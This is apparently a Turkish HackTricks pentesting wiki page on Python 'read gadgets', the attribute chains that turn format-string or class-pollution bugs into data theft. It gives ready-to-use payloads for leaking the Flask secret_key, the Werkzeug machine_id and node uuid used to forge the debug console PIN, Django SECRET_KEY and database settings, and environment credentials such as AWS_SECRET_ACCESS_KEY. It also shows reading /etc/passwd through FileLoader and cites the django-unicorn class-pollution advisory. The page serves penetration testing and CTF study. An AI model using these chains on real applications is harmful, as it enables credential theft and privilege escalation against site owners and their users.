# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}


## Temel Bilgiler

[**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) veya [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) gibi farklı zafiyetler, **Python dahili verilerini okumanıza ancak kod çalıştırmanıza izin vermeyebilir**. Bu nedenle bir pentester, **hassas yetkiler elde etmek ve zafiyeti yükseltmek** için bu okuma izinlerinden mümkün olduğunca yararlanmalıdır.

### Flask - Secret key'i okuma

Bir Flask uygulamasının ana sayfasında muhtemelen bu **secret'ın yapılandırıldığı** **`app`** global nesnesi bulunur.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Bu durumda, [**Bypass Python sandboxes sayfasındaki**](bypass-python-sandboxes/index.html) **global objects'a erişmek** için herhangi bir gadget kullanarak bu objeye erişmek mümkündür.

**Vulnerability farklı bir Python dosyasındaysa**, ana dosyaya ulaşmak ve **global object `app.secret_key`'e erişmek** için dosyalar arasında traversal yapabilecek bir gadget gerekir; böylece bu key'i bilerek [**privileges escalate**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign) edebilirsiniz.

[Bu writeup'tan](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup> alınan bunun gibi bir payload:
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Bu payload'u **`app.secret_key` değerini okumak** için kullanın. Orijinal bug size bir write primitive de sağlıyorsa (örneğin class pollution), aynı yol bu değeri değiştirmek ve daha ayrıcalıklı Flask cookie'lerini imzalamak için kullanılabilir.

### Werkzeug - machine_id ve node uuid

[**Bu writeup'taki payload'ları kullanarak**](https://vozec.fr/writeups/tweedle-dum-dee/) **machine_id** ve **uuid** node'una erişebileceksiniz. Bunlar, [**Werkzeug pin'i oluşturmak**](../../network-services-pentesting/pentesting-web/werkzeug.md) ve `/console` içindeki Python console'una erişmek için ihtiyaç duyduğunuz **private bit'lerdir**; tabii **debug mode etkinse**:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Web sayfasında **bazı hatalar** oluşturarak **sunucunun `app.py` dosyasına giden yerel yolunu** elde edebileceğinizi ve bunun **size yolu vereceğini** unutmayın.

Vulnerability farklı bir python dosyasındaysa, ana python dosyasındaki objelere erişmek için önceki Flask trick'ini kontrol edin.

### Django - SECRET_KEY ve settings module

Django settings objesi, uygulama başladıktan sonra `sys.modules` içinde cache'lenir. Yalnızca read primitive'leriyle **`SECRET_KEY`**, fallback key'lerini, database kimlik bilgilerini veya signing salt'larını leak edebilirsiniz:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Savunmasız gadget başka bir modüldeyse, önce globals üzerinde ilerleyin:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS`, mevcut `SECRET_KEY` kadar değerlidir: rotation sırasında eski imzalı değerleri doğrulamaya devam ederler.<sup>[[1]](#references)</sup> Ayrıca etkinin yalnızca cookie forgery ile mi sınırlı olduğunu yoksa daha güçlü bir etki mi bulunduğunu hızlıca belirlemek için `SESSION_ENGINE` ve `SESSION_SERIALIZER` değerlerini de leak edin. Web etkisinin ayrıntıları için [**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md) sayfasına bakın.

### Module loader gadgets - kaynak kodunu ve dosyaları okuma

Yüklenen Python modülleri genellikle bir `__loader__` özniteliğini korur. File-backed loader'lar sıklıkla `get_source()` ve `get_data()` işlevlerini sunar; bunlar, bir module object'e erişebildiğiniz ancak `open()` işlevine erişemediğiniz durumlarda mükemmel **salt okunur primitive'lerdir**:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Bu, **config modules, blueprints, helper files veya hidden routes** öğelerini dump ederek API anahtarlarını, DSN'leri, flag yollarını veya ek gadget giriş noktalarını kurtarmak için oldukça kullanışlıdır.

Yalnızca subclass enumeration varsa, bir index'i hard-code etmek yerine loader'ı ada göre arayın:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Generator / coroutine frame globals

Bir generator/coroutine object oluşturabilir veya ona erişebilirseniz, frame herhangi bir function `__globals__` gadget'ına ihtiyaç duymadan globals leak edebilir. Bu, yalnızca dunder isimlerini engelleyen ve `gi_frame`, `ag_frame`, `cr_frame` veya `f_globals` gibi frame attribute'larını unutan filter'lara karşı kullanışlıdır:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Frame globals elde ettikten sonra diğer gadget'larda olduğu gibi (`sys.modules`, settings objects, `os.environ`, vb.) devam edin. Recent sandbox escapes, `gi_frame` ve `f_globals` dunder attributes olmadığından ve çoğu zaman naif deny-list'lerden kurtulduğundan bunu yeniden keşfetmeye devam ediyor.

### Yüklenmiş modüller üzerinden ortam değişkenleri / cloud creds

Birçok jail hâlâ bir yerde `os` veya `sys` import ediyor. Erişilebilir herhangi bir fonksiyonun `__init__.__globals__` özelliğini abuse ederek önceden import edilmiş `os` modülüne pivot edebilir ve API token'ları, cloud key'leri veya flag'leri içeren **ortam değişkenlerini** dump edebilirsiniz:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Subclass index filtreleniyorsa, loaders kullanın:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Ortam değişkenleri, read işleminden full compromise'a geçmek için gereken tek secret'lar olabilir (cloud IAM keys, database URLs, signing keys vb.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`), hazırlanmış component request'leri üzerinden **class pollution** yapılmasına izin veriyordu. `__init__.__globals__` gibi bir property path ayarlamak, attacker'ın component module globals'larına ve import edilmiş modüllere (ör. `settings`, `os`, `sys`) erişmesini sağlıyordu. Buradan code execution olmadan `SECRET_KEY`, `DATABASES` veya service credentials leak edilebilir. Exploit chain tamamen read tabanlıdır ve yukarıdakiyle aynı dunder-gadget pattern'lerini kullanır.<sup>[[5]](#references)</sup>

### Chaining için gadget collections

Recent CTF'ler ve pyjail araştırmaları, yalnızca attribute access ve subclass enumeration kullanılarak oluşturulmuş güvenilir read chain'ler olduğunu gösteriyor. [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) gibi community-maintained listeler, objects'tan `__globals__`, `sys.modules` ve son olarak sensitive data'ya geçiş yapmak için birleştirebileceğiniz yüzlerce minimal gadget'ı kataloglar.<sup>[[2]](#references)</sup> Raw subclass index'leri yerine **attribute/name based searches** kullanmayı tercih edin; çünkü `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` vb. öğelerin konumu, Python sürümleri arasında ve ek imported library'lerle birlikte değişir.

## References

- [1] [Django cryptographic signing docs](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – FCSC 2023 writeup](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Django-Unicorn Class Pollution Vulnerability, Leading to RCE, XSS, DoS and Authentication Bypass (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)

{{#include ../../banners/hacktricks-training.md}}
